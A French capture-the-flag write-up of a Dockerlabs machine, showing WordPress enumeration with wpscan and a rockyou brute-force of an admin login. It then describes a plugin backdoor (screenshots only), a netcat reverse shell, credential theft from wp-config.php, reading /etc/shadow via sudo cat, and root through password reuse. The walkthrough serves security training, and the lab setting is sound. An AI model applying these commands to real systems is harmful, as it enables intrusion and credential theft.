---
Titre: Pressenter
date: 2026-10-16
categories:
  - Dockerlabs
description: Pressenter est une machine de niveau facile du dockerlabas, créer par d1se0, la machine comporte un cms wordpress vulnérable a une faiblesse du mot de passe et l'absence d'une mécanisme de blocage de tentative excessif c'est qui permet de brute forcer le compte pressi qui a le privilège admin et modification du plugin `hello dolly` pour une injection de backdoor en php et prendre le contrôle du serveur
Creator: d1se0
tags:
  - Wordpress
  - mysql
  - wpscan
image:
    path: /assets/img/pressenter.png
niveau: facile
---
## Reconnaissance - IP - scan de ports

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ sudo ./auto_deploy.sh pressenter.tar 
[sudo] password for d4fl0n: 

	                    ##        .         
	              ## ## ##       ==         
	           ## ## ## ##      ===         
	       /""""""""""""""""\___/ ===       
	  ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	       \______ o          __/           
	         \    \        __/            
	          \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```


```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ nmap -p- 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-15 14:09 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 62:2B:3B:39:B1:6F (Unknown)
```

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ nmap -p 80 -A -O -sCV 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-15 14:09 -0400
Nmap scan report for 172.17.0.2
Host is up (0.00090s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Pressenter CTF
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 62:2B:3B:39:B1:6F (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
```

le scan nous a relever 1 seul port ouvert qui est le port 80 pour web et sans chiffrement de communication, le protocole http est utilisée 

# Enumération Web

nous allons commencer par l'énumération passif, juste un visite sur l'adresse web `http://172.17.0.2`

![](/assets/img/pressenter-web.png)

sur la page d'accueil nous avons une présentation du ctf et une page d'inscription qui n'envoie pas de donnée, nous allons regarder le code source de la page

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ curl http://172.17.0.2 
. . . .
    <footer>
        <p>&copy; 2024 Pressenter CTF. All rights reserved.</p>
        <p class="hidden-domain">Find us at <a href="http://pressenter.hl" target="_blank">pressenter.hl</a></p>
    </footer>
</body>
</html>
```

dans le code source de la page nous avons trouver un domaine vhost cacher 

```
pressenter.hl
```

passons a la résolution du DNS pour le `vhosts`

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ echo "172.17.0.2 pressenter.hl" | sudo tee -a /etc/hosts
[sudo] password for d4fl0n: 
172.17.0.2 pressenter.hl
```

faisons une visite du site `http://pressenter.hl`

![](/assets/img/pressenter-vhost.png)

sur le vhosts nous avons un cms wordpress avec la version 6.6.1

nous allons maintenant utilise l'outil `wpscan` pour faire de l'énumération du `cms wordpress`

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ wpscan --url http://pressenter.hl -e u,m,at,ap,dbe,cb 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://pressenter.hl/ [172.17.0.2]
[+] Started: Thu Oct 15 14:37:17 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://pressenter.hl/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://pressenter.hl/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://pressenter.hl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.6.1 identified (Insecure, released on 2024-07-23).
 | Found By: Rss Generator (Passive Detection)
 |  - http://pressenter.hl/?feed=rss2, <generator>https://wordpress.org/?v=6.6.1</generator>
 |  - http://pressenter.hl/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.6.1</generator>
 |
 | [!] 28 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.6.4
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 7.0.3 - Subscriber+ Email Change Confirmation Bypass
 |     Fixed in: 6.6.6
 |     References:
 |      - https://wpscan.com/vulnerability/5ca38157-6fae-4271-a242-2a8584505d1e
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Unauthenticated Blind SSRF
 |     Fixed in: 6.6.6
 |     References:
 |      - https://wpscan.com/vulnerability/e1b9918e-1db9-4d95-be44-3241e52946eb
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Author+ CSS Injection
 |     Fixed in: 6.6.6
 |     References:
 |      - https://wpscan.com/vulnerability/1e4f9122-22b9-4fa2-913a-6e84d31ec14c
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Unauthenticated Non-Public Post Type Slug Disclosure
 |     Fixed in: 7.0.3
 |     References:
 |      - https://wpscan.com/vulnerability/cc82dffb-16ea-4ae1-a513-e3ada8e574a0
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5692
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Contributor+ Stored XSS in Quick Edits
 |     Fixed in: 6.6.6
 |     References:
 |      - https://wpscan.com/vulnerability/72b68d3f-77a0-47dd-9624-e3631409a352
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Subscriber+ Arbitrary Site Creation on Multisite
 |     Fixed in: 6.6.6
 |     References:
 |      - https://wpscan.com/vulnerability/b9b44801-3260-4f5a-a4cb-74f2de87e0d1
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.3 - Reflected XSS
 |     Fixed in: 6.6.6
 |     References:
 |      - https://wpscan.com/vulnerability/4594236f-c7ad-41d6-945b-170eaabe2b75
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-3-release/
 |
 | [!] Title: WP < 7.0.4 - Author+ RCE via PDF Upload
 |     Fixed in: 6.6.7
 |     References:
 |      - https://wpscan.com/vulnerability/5061a614-ee26-422a-b4e8-ec88b96bb3cd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-65640
 |      - https://wordpress.org/news/2026/08/wordpress-7-0-4-release/
 |
 | [!] Title: WP < 7.1.1 - Unauthenticated Stored XSS via Comments
 |     Fixed in: 6.6.8
 |     References:
 |      - https://wpscan.com/vulnerability/aa354358-3a32-4e81-8628-d1aa917b5efa
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ Stored XSS via Custom Header
 |     Fixed in: 6.6.8
 |     References:
 |      - https://wpscan.com/vulnerability/0e4cc769-a934-4883-9da5-5721133c6305
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Theme Installation via CSRF
 |     Fixed in: 6.6.8
 |     References:
 |      - https://wpscan.com/vulnerability/2624e094-6c88-43b4-812f-26444994737d
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ Network-Wide Plugin Activation on Multisite
 |     Fixed in: 6.6.8
 |     References:
 |      - https://wpscan.com/vulnerability/0d1f24a1-2161-47cc-8c2d-c3009161153d
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Author+ Path Traversal via Templates REST API
 |     Fixed in: 6.6.8
 |     References:
 |      - https://wpscan.com/vulnerability/eecc3b64-892b-43a8-9da8-457bd311fc55
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Admin+ CSS Injection on Multisite via XML-RPC
 |     Fixed in: 6.6.8
 |     References:
 |      - https://wpscan.com/vulnerability/c16c950c-1a46-4068-8ce9-6e50f9e703b5
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Contributor+ Arbitrary Post Modification
 |     Fixed in: 6.6.8
 |     References:
 |      - https://wpscan.com/vulnerability/e32e8e71-7618-42a7-8a1c-b00750e8581b
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Author+ Unpublished Post Title Disclosure via Attachment Edit Screen
 |     Fixed in: 6.6.8
 |     References:
 |      - https://wpscan.com/vulnerability/a929978a-4c97-4b2a-8933-cc0cb9e0ea46
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Contributor+ Unpublished Post Title Disclosure
 |     Fixed in: 6.6.8
 |     References:
 |      - https://wpscan.com/vulnerability/3da4bdfe-948b-41b6-88fd-7cac9f3b7f73
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Author+ Unauthorized Note Reparenting via REST API
 |     Fixed in: 6.6.8
 |     References:
 |      - https://wpscan.com/vulnerability/bde07f91-aeb2-4875-88f2-4b18e42e331e
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.2 - Unauthenticated LFI via Page Template Resolution
 |     Fixed in: 6.6.9
 |     References:
 |      - https://wpscan.com/vulnerability/507ae4f0-6fb3-4efa-87fc-5b9b1df912c7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-87902
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-2-release/
 |
 | [!] Title: WP < 7.1.3 - Action Injection via Post Status Transition Dynamic Hooks
 |     Fixed in: 6.6.10
 |     References:
 |      - https://wpscan.com/vulnerability/647b00b2-c4c2-4d8c-bda4-f6ab89653866
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Contributor+ Stored XSS via Imgur Embed
 |     Fixed in: 6.6.10
 |     References:
 |      - https://wpscan.com/vulnerability/56fffd6d-497b-402e-9229-9244d5a41403
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Unauthenticated Private Post Comment Disclosure via RSS Feed
 |     Fixed in: 6.6.10
 |     References:
 |      - https://wpscan.com/vulnerability/03cc73e1-73bc-450b-8a84-f7303068cbb5
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Author+ SQLi via WXR Export
 |     Fixed in: 6.6.10
 |     References:
 |      - https://wpscan.com/vulnerability/da37190e-8cc6-463b-926e-43622a7704a5
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Author+ Sticky Post via REST API
 |     Fixed in: 6.6.10
 |     References:
 |      - https://wpscan.com/vulnerability/5406255d-3d8d-4840-854e-67b346e48dc5
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Contributor+ DoS via Block Editor URL Details
 |     Fixed in: 6.6.10
 |     References:
 |      - https://wpscan.com/vulnerability/12650b8b-bb55-4706-9baa-3abeb2d4ae6f
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.3 - Unauthenticated Stored XSS via Comment Moderation
 |     Fixed in: 6.6.10
 |     References:
 |      - https://wpscan.com/vulnerability/df1ca42d-b835-4ed6-a634-3f62ac020e77
 |      - https://wordpress.org/news/2026/10/wordpress-7-1-3-maintenance-and-security-release/

[+] WordPress theme in use: twentytwentyfour
 | Location: http://pressenter.hl/wp-content/themes/twentytwentyfour/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://pressenter.hl/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 | Style URL: http://pressenter.hl/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://pressenter.hl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:31 <==========================================================================================================================================================> (33371 / 33371) 100.00% Time: 00:01:31
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyfour
 | Location: http://pressenter.hl/wp-content/themes/twentytwentyfour/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://pressenter.hl/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 | Style URL: http://pressenter.hl/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://pressenter.hl/wp-content/themes/twentytwentyfour/, status: 200
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://pressenter.hl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.2'

[+] twentytwentythree
 | Location: http://pressenter.hl/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://pressenter.hl/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://pressenter.hl/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressenter.hl/wp-content/themes/twentytwentythree/, status: 200
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://pressenter.hl/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.5'

[+] twentytwentytwo
 | Location: http://pressenter.hl/wp-content/themes/twentytwentytwo/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://pressenter.hl/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://pressenter.hl/wp-content/themes/twentytwentytwo/style.css
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://pressenter.hl/wp-content/themes/twentytwentytwo/, status: 200
 |
 | Version: 1.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://pressenter.hl/wp-content/themes/twentytwentytwo/style.css, Match: 'Version: 1.8'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <=====================================================================================================================================================================> (75 / 75) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:01 <==========================================================================================================================================================> (100 / 100) 100.00% Time: 00:00:01

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] pressi
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] hacker
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 21

[+] Finished: Thu Oct 15 14:39:17 2026
[+] Requests Done: 33752
[+] Cached Requests: 18
[+] Data Sent: 8.791 MB
[+] Data Received: 4.962 MB
[+] Memory used: 349.879 MB
[+] Elapsed time: 00:02:00
```

nous avons trouver des `plugins` vulnérable et 2 utilisateurs valide

```
pressi
hacker
```

nous allons faire du brute force pour trouver le mot de passe de ses utilisateur

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ wpscan --url http://pressenter.hl -U users -P /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://pressenter.hl/ [172.17.0.2]
[+] Started: Thu Oct 15 14:43:02 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.58 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://pressenter.hl/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://pressenter.hl/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://pressenter.hl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.6.1 identified (Insecure, released on 2024-07-23).
 | Found By: Rss Generator (Passive Detection)
 |  - http://pressenter.hl/?feed=rss2, <generator>https://wordpress.org/?v=6.6.1</generator>
 |  - http://pressenter.hl/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.6.1</generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://pressenter.hl/wp-content/themes/twentytwentyfour/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://pressenter.hl/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 | Style URL: http://pressenter.hl/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://pressenter.hl/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - pressi / dumbass                                                                                                                                                                                                                  
^Cying hacker / ilovepurple Time: 00:34:14 <                                                                                                                                                        > (88357 / 28691764)  0.30%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: pressi, Password: dumbass

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                                                                  > (88359 / 28691764)  0.30%  ETA: ??:??:??
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Oct 15 15:17:33 2026
[+] Requests Done: 88501
[+] Cached Requests: 35
[+] Data Sent: 45.213 MB
[+] Data Received: 53.112 MB
[+] Memory used: 287.84 MB
[+] Elapsed time: 00:34:30

Scan Aborted: Canceled by User
```

nous avons trouver le mot de passe de l'utilisateur `pressi`

```
pressi:dumbass
```

nous allons nous connecter au console de l'administrateur

![](/assets/img/pressenter-wp.png)

connexion réussie nous pouvons maintenant modifier un fichier `php` pour injecter notre `backdoor`

![](/assets/img/pressenter-ed.png)

nous avons modifier le plugins `hello.php` pour injecter la fonction qui va nous permettre l'exécution du code

![](/assets/img/pressenter-user.png)

Bingo! passons a l'exploitation 
## Exploitation - Reverse shell

commençons par créer notre reverse shell

```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 40764
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@baf370793b12:/var/www/pressenter/wp-content/plugins$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@baf370793b12:/var/www/pressenter/wp-content/plugins$ 
```

nous avons obtenu notre reverse et nous le rendrons interactif
## Exploitation - énumération system

comme le cms est wordpress il y'a une un fichier `wp-config.php` qui contient les identifiant de connexion a la base de donné MySQL

```bash
www-data@baf370793b12:/var/www/pressenter$ cat wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'admin' );

/** Database password */
define( 'DB_PASSWORD', 'rooteable' );

/** Database hostname */
define( 'DB_HOST', '127.0.0.1' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
```


énumérons la base de donnée 

![](/assets/img/pressenter-my.png)

nous avons trouver un utilisateur nommé `enter` ainsi que son mot de passe

```bash
www-data@baf370793b12:/var/www/pressenter$ getent passwd | grep -i bash
root:x:0:0:root:/root:/bin/bash
enter:x:1001:1001:enter,,,:/home/enter:/bin/bash
www-data@baf370793b12:/var/www/pressenter$ 
```

```
enter:kernellinuxhack
```

## Escalade de privilèges

nous allons escalader au compte de `enter`
```bash
www-data@baf370793b12:/var/www/pressenter$ su enter
Password: 
enter@baf370793b12:/var/www/pressenter$ id
uid=1001(enter) gid=1001(enter) groups=1001(enter),100(users)
enter@baf370793b12:/var/www/pressenter$ 
```

## escalade de privilège - `sudo -l`

```bash
enter@baf370793b12:~$ sudo -l
Matching Defaults entries for enter on baf370793b12:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User enter may run the following commands on baf370793b12:
    (ALL : ALL) NOPASSWD: /usr/bin/cat
    (ALL : ALL) NOPASSWD: /usr/bin/whoami
enter@baf370793b12:~$ 
```

nous allons essayer de récupéré le contenu du fichier `/etc/passwd` et `/etc/shadow` comme nous avons l'autorisation d'utilisé `cat`  avec `sudo`
```bash
enter@baf370793b12:~$ sudo /usr/bin/cat /etc/shadow > shadow
enter@baf370793b12:~$ ls -la
total 36
drwxr-x--- 1 enter enter 4096 Oct 15 22:42 .
drwxr-xr-x 1 root  root  4096 Aug 22  2024 ..
-rw------- 1 enter enter    5 Aug 22  2024 .bash_history
-rw-r--r-- 1 enter enter  220 Aug 22  2024 .bash_logout
-rw-r--r-- 1 enter enter 3771 Aug 22  2024 .bashrc
-rw-r--r-- 1 enter enter  807 Aug 22  2024 .profile
-rw-rw-r-- 1 enter enter  665 Oct 15 22:42 shadow
-rw-r--r-- 1 root  root    33 Aug 22  2024 user.txt
enter@baf370793b12:~$ cp /etc/passwd .
```


```bash
┌──(d4fl0n㉿kali)-[/tmp]
└─$ wget http://172.17.0.2:8080/shadow                                            
--2026-10-15 16:45:11--  http://172.17.0.2:8080/shadow
Connecting to 172.17.0.2:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 665
Saving to: ‘shadow’

shadow                                               100%[======================================================================================================================>]     665  --.-KB/s    in 0s      

2026-10-15 16:45:11 (41.4 MB/s) - ‘shadow’ saved [665/665]


┌──(d4fl0n㉿kali)-[/tmp]
└─$ wget http://172.17.0.2:8080/passwd
--2026-10-15 16:45:15--  http://172.17.0.2:8080/passwd
Connecting to 172.17.0.2:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 944
Saving to: ‘passwd’

passwd                                               100%[======================================================================================================================>]     944  --.-KB/s    in 0s      

2026-10-15 16:45:15 (82.6 MB/s) - ‘passwd’ saved [944/944]
```

d'après de nombre tentative nous avons pu casser le hash, mais nous avons tenter de se connecter au compte `root` avec le mot de passe de l'utilisateur `enter`

***Note:** l'utilisateur `enter` et `root` utilise le même mot de passe

```
root:kernellinuxhack
```

```bash
enter@baf370793b12:~$ su root
Password: 
root@baf370793b12:/home/enter# id
uid=0(root) gid=0(root) groups=0(root)
root@baf370793b12:/home/enter# 
```

## Flag

```bash
root@baf370793b12:~# cat /home/enter/user.txt /root/root_true.txt 
4a05a7bc45edb56b1f033ca1606e176c
4e4a603de810988e0842777de1d97e68
root@baf370793b12:~# 
```


